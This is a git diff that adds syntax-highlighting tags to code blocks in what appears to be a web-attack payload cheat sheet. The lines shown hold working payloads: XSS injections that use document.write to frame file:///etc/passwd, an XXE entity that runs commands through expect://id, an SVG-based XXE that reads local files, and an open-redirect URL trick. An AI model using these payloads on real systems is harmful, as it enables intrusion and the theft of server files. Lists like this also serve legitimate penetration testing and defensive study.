@@ -264,11 +264,11 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 </script>
 ```
 `<iframe>`
-```
+```js
 <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 ```
 `<script>` and `<iframe>` with `document.write`
-```
+```js
 <script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
 --------------------------------------------------------------------------------------------------------------
@@ -306,7 +306,7 @@ If the output of the `win.ini` file on the target returns the response message, 
 </userInfo>
 ```
 ### XXE to RCE
-```
+```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY exploit SYSTEM "expect://id"> ]>
 <userInfo>
@@ -329,7 +329,7 @@ If the output of the `win.ini` file on the target returns the response message, 
 </svg>
 ```
 `LFI`
-```
+```xml
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
 <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
